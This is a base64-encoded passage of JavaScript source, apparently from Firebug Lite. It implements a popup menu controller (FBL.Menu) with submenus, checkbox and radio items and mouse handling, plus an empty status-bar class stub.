1lbnVSYWRpb0J1dHRvbiAiOw0KICAgICAgICAgICAgICAgIGl0ZW0udGFnID0gdGhpcy5yYWRpb0J1dHRvblRhZzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKHR5cGUgPT0gImdyb3VwIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjbGFzc05hbWUgKz0gImZiTWVudUdyb3VwICI7DQogICAgICAgICAgICAgICAgaXRlbS50YWcgPSB0aGlzLmdyb3VwVGFnOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAodHlwZSA9PSAic2hvcnRjdXQiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsYXNzTmFtZSArPSAiZmJNZW51U2hvcnRjdXQgIjsNCiAgICAgICAgICAgICAgICBpdGVtLnRhZyA9IHRoaXMuc2hvcnRjdXRUYWc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChpdGVtLmNoZWNrZWQpDQogICAgICAgICAgICAgICAgY2xhc3NOYW1lICs9ICJmYk1lbnVDaGVja2VkICI7DQogICAgICAgICAgICBlbHNlIGlmIChpdGVtLnNlbGVjdGVkKQ0KICAgICAgICAgICAgICAgIGNsYXNzTmFtZSArPSAiZmJNZW51UmFkaW9TZWxlY3RlZCAiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaXRlbS5kaXNhYmxlZCkNCiAgICAgICAgICAgICAgICBjbGFzc05hbWUgKz0gImZiTWVudURpc2FibGVkICI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGl0ZW0uY2xhc3NOYW1lID0gY2xhc3NOYW1lOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpdGVtLmxhYmVsID0gJFNUUihpdGVtLmxhYmVsKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmVzdWx0LnB1c2goaXRlbSk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgfQ0KfSk7DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCi8qKg0KICogb3B0aW9ucw0KICogb3B0aW9ucy5lbGVtZW50DQogKiBvcHRpb25zLmlkDQogKiBvcHRpb25zLml0ZW1zDQogKiANCiAqIGl0ZW0ubGFiZWwNCiAqIGl0ZW0uY2xhc3NOYW1lDQogKiBpdGVtLnR5cGUNCiAqIGl0ZW0udmFsdWUNCiAqIGl0ZW0uZGlzYWJsZWQNCiAqIGl0ZW0uY2hlY2tlZA0KICogaXRlbS5zZWxlY3RlZA0KICogaXRlbS5jb21tYW5kDQogKiBpdGVtLmNoaWxkDQogKiANCiAqIA0KICogQGNsYXNzDQogKiBAZXh0ZW5kcyBGQkwuQ29udHJvbGxlcg0KICogICANCiAqLw0KRkJMLk1lbnUgPSBmdW5jdGlvbihvcHRpb25zKQ0Kew0KICAgIC8vIGlmIGVsZW1lbnQgaXMgbm90IHByZS1yZW5kZXJlZCwgd2UgbXVzdCByZW5kZXIgaXQgbm93DQogICAgaWYgKCFvcHRpb25zLmVsZW1lbnQpDQogICAgew0KICAgICAgICBpZiAob3B0aW9ucy5nZXRJdGVtcykNCiAgICAgICAgICAgIG9wdGlvbnMuaXRlbXMgPSBvcHRpb25zLmdldEl0ZW1zKCk7DQogICAgICAgIA0KICAgICAgICBvcHRpb25zLmVsZW1lbnQgPSBNZW51UGxhdGUudGFnLmFwcGVuZCgNCiAgICAgICAgICAgICAgICB7b2JqZWN0OiBvcHRpb25zfSwNCiAgICAgICAgICAgICAgICBnZXRFbGVtZW50QnlDbGFzcyhGaXJlYnVnLmNocm9tZS5kb2N1bWVudCwgImZiQm9keSIpLA0KICAgICAgICAgICAgICAgIE1lbnVQbGF0ZQ0KICAgICAgICAgICAgKTsNCiAgICB9DQogICAgDQogICAgLy8gZXh0ZW5kIGl0c2VsZiB3aXRoIHRoZSBwcm92aWRlZCBvcHRpb25zDQogICAgYXBwZW5kKHRoaXMsIG9wdGlvbnMpOw0KICAgIA0KICAgIGlmICh0eXBlb2YgdGhpcy5lbGVtZW50ID09ICJzdHJpbmciKQ0KICAgIHsNCiAgICAgICAgdGhpcy5pZCA9IHRoaXMuZWxlbWVudDsNCiAgICAgICAgdGhpcy5lbGVtZW50ID0gJCh0aGlzLmlkKTsNCiAgICB9DQogICAgZWxzZSBpZiAodGhpcy5pZCkNCiAgICB7DQogICAgICAgIHRoaXMuZWxlbWVudC5pZCA9IHRoaXMuaWQ7DQogICAgfQ0KICAgIA0KICAgIHRoaXMuZWxlbWVudC5maXJlYnVnSWdub3JlID0gdHJ1ZTsNCiAgICB0aGlzLmVsZW1lbnRTdHlsZSA9IHRoaXMuZWxlbWVudC5zdHlsZTsNCiAgICANCiAgICB0aGlzLmlzVmlzaWJsZSA9IGZhbHNlOw0KICAgIA0KICAgIHRoaXMuaGFuZGxlTW91c2VEb3duID0gYmluZCh0aGlzLmhhbmRsZU1vdXNlRG93biwgdGhpcyk7DQogICAgdGhpcy5oYW5kbGVNb3VzZU92ZXIgPSBiaW5kKHRoaXMuaGFuZGxlTW91c2VPdmVyLCB0aGlzKTsNCiAgICB0aGlzLmhhbmRsZU1vdXNlT3V0ID0gYmluZCh0aGlzLmhhbmRsZU1vdXNlT3V0LCB0aGlzKTsNCiAgICANCiAgICB0aGlzLmhhbmRsZVdpbmRvd01vdXNlRG93biA9IGJpbmQodGhpcy5oYW5kbGVXaW5kb3dNb3VzZURvd24sIHRoaXMpOw0KfTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KdmFyIG1lbnVNYXAgPSB7fTsNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KTWVudS5wcm90b3R5cGUgPSAgZXh0ZW5kKENvbnRyb2xsZXIsDQovKipAZXh0ZW5kIEZCTC5NZW51LnByb3RvdHlwZSovDQp7DQogICAgZGVzdHJveTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy9pZiAodGhpcy5lbGVtZW50KSBjb25zb2xlLmxvZygiZGVzdHJveSIsIHRoaXMuZWxlbWVudC5pZCk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmhpZGUoKTsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIGl0IGlzIGEgY2hpbGRNZW51LCByZW1vdmUgaXRzIHJlZmVyZW5jZSBmcm9tIHRoZSBwYXJlbnRNZW51DQogICAgICAgIGlmICh0aGlzLnBhcmVudE1lbnUpDQogICAgICAgICAgICB0aGlzLnBhcmVudE1lbnUuY2hpbGRNZW51ID0gbnVsbDsNCiAgICAgICAgDQogICAgICAgIC8vIHJlbW92ZSB0aGUgZWxlbWVudCBmcm9tIHRoZSBkb2N1bWVudA0KICAgICAgICB0aGlzLmVsZW1lbnQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZCh0aGlzLmVsZW1lbnQpOw0KICAgICAgICANCiAgICAgICAgLy8gY2xlYXIgcmVmZXJlbmNlcw0KICAgICAgICB0aGlzLmVsZW1lbnQgPSBudWxsOw0KICAgICAgICB0aGlzLmVsZW1lbnRTdHlsZSA9IG51bGw7DQogICAgICAgIHRoaXMucGFyZW50TWVudSA9IG51bGw7DQogICAgICAgIHRoaXMucGFyZW50VGFyZ2V0ID0gbnVsbDsNCiAgICB9LA0KICAgIA0KICAgIGluaXRpYWxpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIENvbnRyb2xsZXIuaW5pdGlhbGl6ZS5jYWxsKHRoaXMpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5hZGRDb250cm9sbGVyKA0KICAgICAgICAgICAgICAgIFt0aGlzLmVsZW1lbnQsICJtb3VzZWRvd24iLCB0aGlzLmhhbmRsZU1vdXNlRG93bl0sDQogICAgICAgICAgICAgICAgW3RoaXMuZWxlbWVudCwgIm1vdXNlb3ZlciIsIHRoaXMuaGFuZGxlTW91c2VPdmVyXQ0KICAgICAgICAgICAgICk7DQogICAgfSwNCiAgICANCiAgICBzaHV0ZG93bjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgQ29udHJvbGxlci5zaHV0ZG93bi5jYWxsKHRoaXMpOw0KICAgIH0sDQogICAgDQogICAgc2hvdzogZnVuY3Rpb24oeCwgeSkNCiAgICB7DQogICAgICAgIHRoaXMuaW5pdGlhbGl6ZSgpOw0KICAgICAgICANCiAgICAgICAgaWYgKHRoaXMuaXNWaXNpYmxlKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGUubG9nKCJzaG93IiwgdGhpcy5lbGVtZW50LmlkKTsNCiAgICAgICAgDQogICAgICAgIHggPSB4IHx8IDA7DQogICAgICAgIHkgPSB5IHx8IDA7DQogICAgICAgIA0KICAgICAgICBpZiAodGhpcy5wYXJlbnRNZW51KQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgb2xkQ2hpbGRNZW51ID0gdGhpcy5wYXJlbnRNZW51LmNoaWxkTWVudTsNCiAgICAgICAgICAgIGlmIChvbGRDaGlsZE1lbnUgJiYgb2xkQ2hpbGRNZW51ICE9IHRoaXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgb2xkQ2hpbGRNZW51LmRlc3Ryb3koKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdGhpcy5wYXJlbnRNZW51LmNoaWxkTWVudSA9IHRoaXM7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgYWRkRXZlbnQoRmlyZWJ1Zy5jaHJvbWUuZG9jdW1lbnQsICJtb3VzZWRvd24iLCB0aGlzLmhhbmRsZVdpbmRvd01vdXNlRG93bik7DQogICAgICAgIA0KICAgICAgICB0aGlzLmVsZW1lbnRTdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgdGhpcy5lbGVtZW50U3R5bGUudmlzaWJpbGl0eSA9ICJoaWRkZW4iOw0KICAgICAgICANCiAgICAgICAgdmFyIHNpemUgPSBGaXJlYnVnLmNocm9tZS5nZXRTaXplKCk7DQogICAgICAgIA0KICAgICAgICB4ID0gTWF0aC5taW4oeCwgc2l6ZS53aWR0aCAtIHRoaXMuZWxlbWVudC5jbGllbnRXaWR0aCAtIDEwKTsNCiAgICAgICAgeCA9IE1hdGgubWF4KHgsIDApOw0KICAgICAgICANCiAgICAgICAgeSA9IE1hdGgubWluKHksIHNpemUuaGVpZ2h0IC0gdGhpcy5lbGVtZW50LmNsaWVudEhlaWdodCAtIDEwKTsNCiAgICAgICAgeSA9IE1hdGgubWF4KHksIDApOw0KICAgICAgICANCiAgICAgICAgdGhpcy5lbGVtZW50U3R5bGUubGVmdCA9IHggKyAicHgiOw0KICAgICAgICB0aGlzLmVsZW1lbnRTdHlsZS50b3AgPSB5ICsgInB4IjsNCiAgICAgICAgDQogICAgICAgIHRoaXMuZWxlbWVudFN0eWxlLnZpc2liaWxpdHkgPSAidmlzaWJsZSI7DQogICAgICAgIA0KICAgICAgICB0aGlzLmlzVmlzaWJsZSA9IHRydWU7DQogICAgICAgIA0KICAgICAgICBpZiAoaXNGdW5jdGlvbih0aGlzLm9uU2hvdykpDQogICAgICAgICAgICB0aGlzLm9uU2hvdy5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQogICAgDQogICAgaGlkZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5jbGVhckhpZGVUaW1lb3V0KCk7DQogICAgICAgIHRoaXMuY2xlYXJTaG93Q2hpbGRUaW1lb3V0KCk7DQogICAgICAgIA0KICAgICAgICBpZiAoIXRoaXMuaXNWaXNpYmxlKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGUubG9nKCJoaWRlIiwgdGhpcy5lbGVtZW50LmlkKTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuZWxlbWVudFN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIA0KICAgICAgICBpZih0aGlzLmNoaWxkTWVudSkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5jaGlsZE1lbnUuZGVzdHJveSgpOw0KICAgICAgICAgICAgdGhpcy5jaGlsZE1lbnUgPSBudWxsOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZih0aGlzLnBhcmVudFRhcmdldCkNCiAgICAgICAgICAgIHJlbW92ZUNsYXNzKHRoaXMucGFyZW50VGFyZ2V0LCAiZmJNZW51R3JvdXBTZWxlY3RlZCIpOw0KICAgICAgICANCiAgICAgICAgdGhpcy5pc1Zpc2libGUgPSBmYWxzZTsNCiAgICAgICAgDQogICAgICAgIHRoaXMuc2h1dGRvd24oKTsNCiAgICAgICAgDQogICAgICAgIGlmIChpc0Z1bmN0aW9uKHRoaXMub25IaWRlKSkNCiAgICAgICAgICAgIHRoaXMub25IaWRlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgfSwNCiAgICANCiAgICBzaG93Q2hpbGRNZW51OiBmdW5jdGlvbih0YXJnZXQpDQogICAgew0KICAgICAgICB2YXIgaWQgPSB0YXJnZXQuZ2V0QXR0cmlidXRlKCJjaGlsZCIpOw0KICAgICAgICANCiAgICAgICAgdmFyIHBhcmVudCA9IHRoaXM7DQogICAgICAgIHZhciB0YXJnZXQgPSB0YXJnZXQ7DQogICAgICAgIA0KICAgICAgICB0aGlzLnNob3dDaGlsZFRpbWVvdXQgPSBGaXJlYnVnLmNocm9tZS53aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgICAgDQogICAgICAgICAgICAvL2lmICghcGFyZW50LmlzVmlzaWJsZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgYm94ID0gRmlyZWJ1Zy5jaHJvbWUuZ2V0RWxlbWVudEJveCh0YXJnZXQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgY2hpbGRNZW51T2JqZWN0ID0gbWVudU1hcC5oYXNPd25Qcm9wZXJ0eShpZCkgPw0KICAgICAgICAgICAgICAgICAgICBtZW51TWFwW2lkXSA6IHtlbGVtZW50OiAkKGlkKX07DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBjaGlsZE1lbnUgPSBuZXcgTWVudShleHRlbmQoY2hpbGRNZW51T2JqZWN0LCANCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHBhcmVudE1lbnU6IHBhcmVudCwNCiAgICAgICAgICAgICAgICAgICAgcGFyZW50VGFyZ2V0OiB0YXJnZXQNCiAgICAgICAgICAgICAgICB9KSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBvZmZzZXRMZWZ0ID0gaXNJRTYgPyAtMSA6IC02OyAvLyBJRTYgcHJvYmxlbSB3aXRoIGZpeGVkIHBvc2l0aW9uDQogICAgICAgICAgICBjaGlsZE1lbnUuc2hvdyhib3gubGVmdCArIGJveC53aWR0aCArIG9mZnNldExlZnQsIGJveC50b3AgLTYpOw0KICAgICAgICAgICAgc2V0Q2xhc3ModGFyZ2V0LCAiZmJNZW51R3JvdXBTZWxlY3RlZCIpOw0KICAgICAgICAgICAgDQogICAgICAgIH0sMzUwKTsNCiAgICB9LA0KICAgIA0KICAgIGNsZWFySGlkZVRpbWVvdXQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmhpZGVUaW1lb3V0KQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS53aW5kb3cuY2xlYXJUaW1lb3V0KHRoaXMuaGlkZVRpbWVvdXQpOw0KICAgICAgICAgICAgZGVsZXRlIHRoaXMuaGlkZVRpbWVvdXQ7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGNsZWFyU2hvd0NoaWxkVGltZW91dDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYodGhpcy5zaG93Q2hpbGRUaW1lb3V0KQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLmNocm9tZS53aW5kb3cuY2xlYXJUaW1lb3V0KHRoaXMuc2hvd0NoaWxkVGltZW91dCk7DQogICAgICAgICAgICB0aGlzLnNob3dDaGlsZFRpbWVvdXQgPSBudWxsOw0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBoYW5kbGVNb3VzZURvd246IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgICAgICANCiAgICAgICAgdmFyIHRvcFBhcmVudCA9IHRoaXM7DQogICAgICAgIHdoaWxlICh0b3BQYXJlbnQucGFyZW50TWVudSkNCiAgICAgICAgICAgIHRvcFBhcmVudCA9IHRvcFBhcmVudC5wYXJlbnRNZW51Ow0KICAgICAgICANCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICANCiAgICAgICAgdGFyZ2V0ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgImZiTWVudU9wdGlvbiIpOw0KICAgICAgICANCiAgICAgICAgaWYoIXRhcmdldCB8fCBoYXNDbGFzcyh0YXJnZXQsICJmYk1lbnVHcm91cCIpKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICANCiAgICAgICAgaWYgKHRhcmdldCAmJiAhaGFzQ2xhc3ModGFyZ2V0LCAiZmJNZW51RGlzYWJsZWQiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHR5cGUgPSB0YXJnZXQuZ2V0QXR0cmlidXRlKCJ0eXBlIik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICh0eXBlID09ICJjaGVja2JveCIpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGNoZWNrZWQgPSB0YXJnZXQuZ2V0QXR0cmlidXRlKCJjaGVja2VkIik7DQogICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gdGFyZ2V0LmdldEF0dHJpYnV0ZSgidmFsdWUiKTsNCiAgICAgICAgICAgICAgICB2YXIgd2FzQ2hlY2tlZCA9IGhhc0NsYXNzKHRhcmdldCwgImZiTWVudUNoZWNrZWQiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAod2FzQ2hlY2tlZCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJlbW92ZUNsYXNzKHRhcmdldCwgImZiTWVudUNoZWNrZWQiKTsNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0LnNldEF0dHJpYnV0ZSgiY2hlY2tlZCIsICIiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgc2V0Q2xhc3ModGFyZ2V0LCAiZmJNZW51Q2hlY2tlZCIpOw0KICAgICAgICAgICAgICAgICAgICB0YXJnZXQuc2V0QXR0cmlidXRlKCJjaGVja2VkIiwgInRydWUiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKGlzRnVuY3Rpb24odGhpcy5vbkNoZWNrKSkNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5vbkNoZWNrLmNhbGwodGhpcywgdGFyZ2V0LCB2YWx1ZSwgIXdhc0NoZWNrZWQpOw0KICAgICAgICAgICAgfSAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAodHlwZSA9PSAicmFkaW9idXR0b24iKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBzZWxlY3RlZFJhZGlvcyA9IGdldEVsZW1lbnRzQnlDbGFzcyh0YXJnZXQucGFyZW50Tm9kZSwgImZiTWVudVJhZGlvU2VsZWN0ZWQiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgZ3JvdXAgPSB0YXJnZXQuZ2V0QXR0cmlidXRlKCJncm91cCIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBsZW5ndGggPSBzZWxlY3RlZFJhZGlvcy5sZW5ndGg7IGkgPCBsZW5ndGg7IGkrKykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJhZGlvID0gc2VsZWN0ZWRSYWRpb3NbaV07DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAocmFkaW8uZ2V0QXR0cmlidXRlKCJncm91cCIpID09IGdyb3VwKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVDbGFzcyhyYWRpbywgImZiTWVudVJhZGlvU2VsZWN0ZWQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJhZGlvLnNldEF0dHJpYnV0ZSgic2VsZWN0ZWQiLCAiIik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgc2V0Q2xhc3ModGFyZ2V0LCAiZmJNZW51UmFkaW9TZWxlY3RlZCIpOw0KICAgICAgICAgICAgICAgIHRhcmdldC5zZXRBdHRyaWJ1dGUoInNlbGVjdGVkIiwgInRydWUiKTsNCiAgICAgICAgICAgIH0gICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIGhhbmRsZXIgPSBudWxsOw0KICAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gdGFyZ2V0LmNvbW1hbmQgY2FuIGJlIGEgZnVuY3Rpb24gb3IgYSBzdHJpbmcuIA0KICAgICAgICAgICAgdmFyIGNtZCA9IHRhcmdldC5jb21tYW5kOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBJZiBpdCBpcyBhIGZ1bmN0aW9uIGl0IHdpbGwgYmUgdXNlZCBhcyB0aGUgaGFuZGxlcg0KICAgICAgICAgICAgaWYgKGlzRnVuY3Rpb24oY21kKSkNCiAgICAgICAgICAgICAgICBoYW5kbGVyID0gY21kOw0KICAgICAgICAgICAgLy8gSWYgaXQgaXMgYSBzdHJpbmcgaXQgdGhlIHByb3BlcnR5IG9mIHRoZSBjdXJyZW50IG1lbnUgb2JqZWN0IA0KICAgICAgICAgICAgLy8gd2lsbCBiZSB1c2VkIGFzIHRoZSBoYW5kbGVyDQogICAgICAgICAgICBlbHNlIGlmICh0eXBlb2YgY21kID09ICJzdHJpbmciKQ0KICAgICAgICAgICAgICAgIGhhbmRsZXIgPSB0aGlzW2NtZF07DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBjbG9zZU1lbnUgPSB0cnVlOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaGFuZGxlcikNCiAgICAgICAgICAgICAgICBjbG9zZU1lbnUgPSBoYW5kbGVyLmNhbGwodGhpcywgdGFyZ2V0KSAhPT0gZmFsc2U7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChjbG9zZU1lbnUpDQogICAgICAgICAgICAgICAgdG9wUGFyZW50LmhpZGUoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQogICAgDQogICAgaGFuZGxlV2luZG93TW91c2VEb3duOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIC8vY29uc29sZS5sb2coImhhbmRsZVdpbmRvd01vdXNlRG93biIpOw0KICAgICAgICANCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICANCiAgICAgICAgdGFyZ2V0ID0gZ2V0QW5jZXN0b3JCeUNsYXNzKHRhcmdldCwgImZiTWVudSIpOw0KICAgICAgICANCiAgICAgICAgaWYgKCF0YXJnZXQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlbW92ZUV2ZW50KEZpcmVidWcuY2hyb21lLmRvY3VtZW50LCAibW91c2Vkb3duIiwgdGhpcy5oYW5kbGVXaW5kb3dNb3VzZURvd24pOw0KICAgICAgICAgICAgdGhpcy5oaWRlKCk7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgaGFuZGxlTW91c2VPdmVyOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIC8vY29uc29sZS5sb2coImhhbmRsZU1vdXNlT3ZlciIsIHRoaXMuZWxlbWVudC5pZCk7DQogICAgICAgIA0KICAgICAgICB0aGlzLmNsZWFySGlkZVRpbWVvdXQoKTsNCiAgICAgICAgdGhpcy5jbGVhclNob3dDaGlsZFRpbWVvdXQoKTsNCiAgICAgICAgDQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgDQogICAgICAgIHRhcmdldCA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJmYk1lbnVPcHRpb24iKTsNCiAgICAgICAgDQogICAgICAgIGlmKCF0YXJnZXQpDQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIA0KICAgICAgICB2YXIgY2hpbGRNZW51ID0gdGhpcy5jaGlsZE1lbnU7DQogICAgICAgIGlmKGNoaWxkTWVudSkgDQogICAgICAgIHsNCiAgICAgICAgICAgIHJlbW92ZUNsYXNzKGNoaWxkTWVudS5wYXJlbnRUYXJnZXQsICJmYk1lbnVHcm91cFNlbGVjdGVkIik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChjaGlsZE1lbnUucGFyZW50VGFyZ2V0ICE9IHRhcmdldCAmJiBjaGlsZE1lbnUuaXNWaXNpYmxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNoaWxkTWVudS5jbGVhckhpZGVUaW1lb3V0KCk7IA0KICAgICAgICAgICAgICAgIGNoaWxkTWVudS5oaWRlVGltZW91dCA9IEZpcmVidWcuY2hyb21lLndpbmRvdy5zZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICAgICAgICAgIGNoaWxkTWVudS5kZXN0cm95KCk7DQogICAgICAgICAgICAgICAgfSwzMDApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZihoYXNDbGFzcyh0YXJnZXQsICJmYk1lbnVHcm91cCIpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnNob3dDaGlsZE1lbnUodGFyZ2V0KTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQphcHBlbmQoTWVudSwNCi8qKkBleHRlbmQgRkJMLk1lbnUqLw0Kew0KICAgIHJlZ2lzdGVyOiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICBtZW51TWFwW29iamVjdC5pZF0gPSBvYmplY3Q7DQogICAgfSwNCiAgICANCiAgICBjaGVjazogZnVuY3Rpb24oZWxlbWVudCkNCiAgICB7DQogICAgICAgIHNldENsYXNzKGVsZW1lbnQsICJmYk1lbnVDaGVja2VkIik7DQogICAgICAgIGVsZW1lbnQuc2V0QXR0cmlidXRlKCJjaGVja2VkIiwgInRydWUiKTsNCiAgICB9LA0KICAgIA0KICAgIHVuY2hlY2s6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICByZW1vdmVDbGFzcyhlbGVtZW50LCAiZmJNZW51Q2hlY2tlZCIpOw0KICAgICAgICBlbGVtZW50LnNldEF0dHJpYnV0ZSgiY2hlY2tlZCIsICIiKTsNCiAgICB9LA0KICAgIA0KICAgIGRpc2FibGU6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICBzZXRDbGFzcyhlbGVtZW50LCAiZmJNZW51RGlzYWJsZWQiKTsNCiAgICB9LA0KICAgIA0KICAgIGVuYWJsZTogZnVuY3Rpb24oZWxlbWVudCkNCiAgICB7DQogICAgICAgIHJlbW92ZUNsYXNzKGVsZW1lbnQsICJmYk1lbnVEaXNhYmxlZCIpOw0KICAgIH0NCn0pOw0KDQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBTdGF0dXMgQmFyDQoNCi8qKkBjbGFzcyovDQpmdW5jdGlvbiBTdGF0dXNCYXIoKXt9Ow0KDQpTdGF0dXNCYXIucHJvdG90eXBlID0gZXh0ZW5kKENvbnRyb2xsZXIsIHsNCiAgICANCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqK